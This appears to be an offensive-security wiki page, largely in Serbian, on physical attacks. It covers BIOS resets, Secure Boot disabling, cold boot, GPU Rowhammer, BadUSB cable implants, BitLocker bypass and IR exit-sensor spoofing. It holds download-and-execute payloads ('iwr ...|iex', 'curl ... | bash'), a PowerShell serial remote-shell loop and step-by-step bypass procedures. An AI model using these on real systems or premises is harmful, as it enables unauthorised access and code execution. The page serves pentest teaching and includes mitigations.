# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**Resetting the BIOS** može se postići na nekoliko načina. Većina matičnih ploča uključuje **battery** koja, kada se ukloni na oko **30 minutes**, resetuje BIOS podešavanja, uključujući lozinku. Alternativno, **jumper on the motherboard** može se podesiti da resetuje ova podešavanja povezivanjem određenih pinova.

Za situacije u kojima hardverske izmene nisu moguće ili praktične, **software tools** nude rešenje. Pokretanje sistema sa **Live CD/USB** uz distribucije kao što je **Kali Linux** omogućava pristup alatima kao što su **_killCmos_** i **_CmosPWD_**, koji mogu pomoći pri oporavku BIOS lozinke.

U slučajevima kada BIOS lozinka nije poznata, unošenje pogrešne lozinke **three times** obično će rezultovati error code. Ovaj code može se koristiti na sajtovima kao što je [https://bios-pw.org](https://bios-pw.org) kako bi se potencijalno dobila upotrebljiva lozinka.

### UEFI Security

Za moderne sisteme koji koriste **UEFI** umesto tradicionalnog BIOS-a, alat **chipsec** može se koristiti za analizu i izmenu UEFI podešavanja, uključujući onemogućavanje **Secure Boot**. Ovo se može postići sledećom komandom:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Analiza RAM-a i Cold Boot napadi

RAM zadržava podatke kratko nakon isključenja napajanja, obično **1 do 2 minuta**. Ova postojanost može da se produži do **10 minuta** primenom hladnih supstanci, kao što je tečni azot. Tokom ovog produženog perioda, može se napraviti **memory dump** koristeći alate kao što su **dd.exe** i **volatility** za analizu.

---

## GPU Rowhammer protiv page table-ova

Moderni GPU Rowhammer napadi postaju mnogo korisniji kada ciljaju **GPU virtual-memory metadata** umesto običnih bafera. Nedavni rad na **GDDR6 NVIDIA Ampere GPUs** pokazuje da napadač koji pokreće neprivilegovani CUDA code može da izgradi GPU-specifične obrasce za hammering, koristi **memory massaging** da postavi paging strukture u ranjive redove, a zatim flipuje bitove u **last-level page table** ili u intermedijarni **page directory**. Kada se jedna translation entry ošteti, napadač može da pokrene **arbitrary GPU memory read/write** i zatim da pivotuje ka kompromitaciji hosta.

### Obrazac eksploatacije

1. **Profilisati redove podložne hammeringu** u GDDR6 i izgraditi refresh-aware / non-uniform hammering obrasce koji zaobilaze in-DRAM mitigations.
2. **Massage GPU allocations** tako da driver postavi page-translation strukture na ranjive fizičke lokacije umesto da ih drži u podrazumevanom zaštićenom pool-u. U praksi ovo može značiti iscrpljivanje low-memory page-table regiona i spraying velikih sparse UVM mappings sa kontrolisanim stride-ovima.
3. **Flipovati translation metadata** kao što su **PFN** ili aperture-related bitovi unutar page-table / page-directory entry tako da virtual page pod kontrolom napadača bude rezolvirana na page-table stranice, arbitrarni GPU memory ili host-visible system mappings.
4. Ponovo iskoristiti forged mapping da se prepišu dodatne translation entries i eskalirati u **arbitrary GPU memory read/write** kroz GPU contexts.

### Pivot ka hostu i mitigations

- Sa **IOMMU disabled**, forged system-aperture mappings mogu da izlože arbitrarni **host physical memory** GPU-u, pretvarajući GPU primitive u potpunu kompromitaciju hosta.
- **GDDRHammer** cilja last-level page-table entries, dok **GeForge** pokazuje da je oštećenje page-directory nivoa može biti lakše jer jedan bit flip može da preusmeri veće translation subtree. Nemojte tretirati samo jedan paging layer kao security-critical.
- **IOMMU** i dalje ima značaja jer blokira direktnu arbitrary-host-memory putanju koju koriste GDDRHammer/GeForge, ali to **nije potpuna mitigacija**. **GPUBreach** pokazuje pivot u drugoj fazi gde napadač ošteti GPU-writable, driver-owned CPU buffers, a zatim okida NVIDIA driver memory-safety bugs da bi dobio kernel write primitive i **root shell** čak i sa uključenim IOMMU.
- **System-level ECC** je praktičan korak za hardening na podržanim workstation/server GPU-ima. Consumer GPUs bez ECC izlažu slabiju defense površinu.
- Ovi napadi nisu čisto teorijski: **GeForge** je prijavio **1,171** bit flip-ova na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izgradnju funkcionalnog lanca za eskalaciju privilegija na hostu.

---

## Napadi preko Direct Memory Access (DMA)

**INCEPTION** je alat dizajniran za **physical memory manipulation** kroz DMA, kompatibilan sa interfejsima kao što su **FireWire** i **Thunderbolt**. Omogućava zaobilaženje login procedura patchovanjem memorije tako da prihvati bilo koju lozinku. Međutim, neefikasan je protiv sistema **Windows 10**.

---

## Live CD/USB za pristup sistemu

Zamena sistemskih binarnih fajlova kao što su **_sethc.exe_** ili **_Utilman.exe_** kopijom **_cmd.exe_** može da obezbedi command prompt sa sistemskim privilegijama. Alati kao što je **chntpw** mogu da se koriste za uređivanje **SAM** fajla Windows instalacije, što omogućava promenu lozinke.

**Kon-Boot** je alat koji olakšava prijavljivanje na Windows sisteme bez znanja lozinke tako što privremeno modifikuje Windows kernel ili UEFI. Više informacija može da se nađe na [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Rukovanje Windows security feature-ima

### Boot i Recovery prečice

- **Supr**: Pristup BIOS podešavanjima.
- **F8**: Ulazak u Recovery mode.
- Pritiskanje **Shift** nakon Windows banera može da zaobiđe autologon.

### BAD USB uređaji

Uređaji kao što su **Rubber Ducky** i **Teensyduino** služe kao platforme za kreiranje **bad USB** uređaja, sposobnih da izvrše unapred definisane payload-ove kada se povežu sa target računarom.

### Volume Shadow Copy

Administrator privilegije omogućavaju kreiranje kopija osetljivih fajlova, uključujući **SAM** fajl, kroz PowerShell.

## BadUSB / HID Implant tehnike

### Wi-Fi managed cable implants

- Implanti zasnovani na ESP32-S3 kao što je **Evil Crow Cable Wind** skrivaju se unutar USB-A→USB-C ili USB-C↔USB-C kablova, predstavljaju se isključivo kao USB keyboard, i izlažu svoj C2 stack preko Wi-Fi. Operatoru je dovoljno da napaja kabl sa victim host-a, napravi hotspot nazvan `Evil Crow Cable Wind` sa lozinkom `123456789`, i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegov DHCP address) da bi došao do embedded HTTP interfejsa.
- Browser UI pruža tabove za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, i *Config*. Sačuvani payload-ovi su označeni po OS-u, keyboard layout-ovi se menjaju u hodu, a VID/PID strings mogu da se izmene da bi se imitirao poznati peripheral.
- Pošto C2 živi unutar kabla, telefon može da postavlja payload-ove, pokreće izvršavanje i upravlja Wi-Fi credentials bez dodirivanja host OS-a—idealno za kratkotrajne physical intrusion.

### OS-aware AutoExec payload-ovi

- AutoExec pravila vezuju jedan ili više payload-ova da se pokrenu odmah nakon USB enumeracije. Implant radi lagano OS fingerprinting i bira odgovarajući script.
- Primer workflow-a:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, samo zamena charging kabla može da omogući “plug-and-pwn” initial access pod kontekstom prijavljenog korisnika.

### HID-bootstrapped remote shell preko Wi-Fi TCP

1. **Keystroke bootstrap:** Sačuvani payload otvara konzolu i nalepljuje loop koji izvršava sve što stigne na novi USB serial device. Minimalna Windows varijanta je:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant održava USB CDC kanal otvoren dok njegov ESP32-S3 pokreće TCP klijenta (Python skripta, Android APK ili desktop izvršna datoteka) nazad ka operatoru. Svaki bajt otkucan u TCP sesiji prosleđuje se u serijski loop iznad, što daje remote command execution čak i na air-gapped hostovima. Izlaz je ograničen, pa operatori obično pokreću blind komande (kreiranje naloga, staging dodatnog alata itd.).

### HTTP OTA update surface

- Isti web stack obično izlaže unauthenticated firmware update-e. Evil Crow Cable Wind osluškuje na `/update` i flešuje bilo koji uploadovani binary:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Zaobilaženje BitLocker enkripcije

BitLocker enkripcija se potencijalno može zaobići ako se **recovery password** pronađe u fajlu sa memory dump-om (**MEMORY.DMP**). Alati kao što su **Elcomsoft Forensic Disk Decryptor** ili **Passware Kit Forensic** mogu se iskoristiti za ovu svrhu.

---

## Social Engineering za dodavanje recovery ključa

Novi BitLocker recovery ključ može se dodati kroz social engineering taktike, tako što se korisnik ubedi da izvrši komandu koja dodaje novi recovery ključ sastavljen od nula, čime se pojednostavljuje proces dešifrovanja.

---

## Iskorišćavanje chassis intrusion / maintenance switch-eva za vraćanje BIOS-a na fabrička podešavanja

Mnogi moderni laptopovi i desktop računari malog form faktora uključuju **chassis-intrusion switch** koji nadzire Embedded Controller (EC) i BIOS/UEFI firmware. Iako je primarna svrha ovog prekidača da podigne alarm kada se uređaj otvori, vendori ponekad implementiraju **nedokumentovani recovery shortcut** koji se aktivira kada se prekidač toggluje u specifičnom obrascu.

### Kako napad radi

1. Prekidač je povezan na **GPIO interrupt** na EC-u.
2. Firmware koji radi na EC-u prati **tajming i broj pritisaka**.
3. Kada se prepozna hard-coded obrazac, EC poziva rutinu *mainboard-reset* koja **briše sadržaj system NVRAM/CMOS**.
4. Pri sledećem boot-u, BIOS učitava podrazumevane vrednosti – **supervisor password, Secure Boot keys, i sve custom konfiguracije se brišu**.

> Kada je Secure Boot onemogućen i firmware password nestane, napadač može jednostavno da podigne bilo koji eksterni OS image i dobije neograničen pristup internim diskovima.

### Stvarni primer – Framework 13 Laptop

Recovery shortcut za Framework 13 (11th/12th/13th-gen) je:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nakon desetog ciklusa EC postavlja flag koji instruira BIOS da obriše NVRAM pri sledećem reboot-u. Cela procedura traje ~40 s i zahteva **ništa osim šrafcigera**.

### Generic Exploitation Procedure

1. Uključi ili suspend-resume cilj tako da EC radi.
2. Skini donji poklopac da izložiš intrusion/maintenance switch.
3. Reprodukuj vendor-specific toggle pattern (pogledaj dokumentaciju, forume ili reverse-engineer EC firmware).
4. Ponovo sastavi uređaj i reboot-uj – firmware protections bi trebalo da budu onemogućene.
5. Boot-uj live USB (npr. Kali Linux) i obavi uobičajeni post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, itd.).

### Detection & Mitigation

* Loguj chassis-intrusion događaje u OS management console i korreliši ih sa neočekivanim BIOS reset-ovima.
* Koristi **tamper-evident seals** na šrafovima/poklopcima da otkriješ otvaranje.
* Drži uređaje u **physically controlled areas**; pretpostavi da fizički pristup znači potpuni compromise.
* Gde je dostupno, onemogući vendor “maintenance switch reset” feature ili zahtevaj dodatnu kriptografsku autorizaciju za NVRAM resetove.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” senzori koriste near-IR LED emitter uparen sa TV-remote style receiver module koji prijavljuje logic high tek nakon što je video više pulseva (~4–10) odgovarajućeg carrier-a (≈30 kHz).
- Plastični shroud blokira emitter i receiver da direktno gledaju jedan u drugog, pa controller pretpostavlja da je svaki validirani carrier došao od obližnje refleksije i pokreće relay koji otvara door strike.
- Jednom kada controller poveruje da je target prisutan, često menja outbound modulation envelope, ali receiver i dalje prihvata svaki burst koji odgovara filtriranom carrier-u.

### Attack Workflow
1. **Capture the emission profile** – zakači logic analyser preko controller pinova da zabeležiš i pre-detection i post-detection waveforms koji pokreću interni IR LED.
2. **Replay only the “post-detection” waveform** – ukloni/ignoriši stock emitter i pokreći external IR LED sa već aktiviranim pattern-om od samog početka. Pošto receiver brine samo o broju pulseva/frequency, tretira spoofed carrier kao pravu refleksiju i postavlja relay line.
3. **Gate the transmission** – šalji carrier u umerenim burst-ovima (npr. desetine milisekundi uključeno, slično isključeno) da isporučiš minimalan broj pulseva bez zasićenja receiver AGC ili interference handling logic. Kontinuirana emission brzo smanjuje osetljivost senzora i sprečava aktiviranje relay-a.

### Long-Range Reflective Injection
- Zamena bench LED-a sa high-power IR diodom, MOSFET driver-om i focusing optics omogućava pouzdano triggering sa ~6 m udaljenosti.
- Napadaču nije potreban line-of-sight do receiver aperture; usmeravanje beam-a na unutrašnje zidove, police ili door frame-ove koji su vidljivi kroz staklo omogućava da reflektovana energija uđe u ~30° field of view i imitira wave rukom iz blizine.
- Pošto receiver-i očekuju samo slabe reflections, mnogo jači external beam može da se odbija od više površina i i dalje ostane iznad detection threshold-a.

### Weaponised Attack Torch
- Ugradnja driver-a u komercijalnu flashlight skriva alat na vidnom mestu. Zameni vidljivu LED sa high-power IR LED-om usklađenim sa band-om receiver-a, dodaj ATtiny412 (ili slično) da generiše ≈30 kHz bursts, i koristi MOSFET da povlači LED current.
- Telescopic zoom lens sužava beam za domet/preciznost, dok vibration motor pod MCU kontrolom daje haptic confirmation da je modulation aktivna bez emitovanja vidljive svetlosti.
- Prebacivanje kroz nekoliko sačuvanih modulation pattern-a (blago različite carrier frequencies i envelopes) povećava kompatibilnost između rebranded sensor family-ja, omogućavajući operatoru da pređe preko reflektivnih površina dok relay ne klikne čujno i door se oslobodi.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
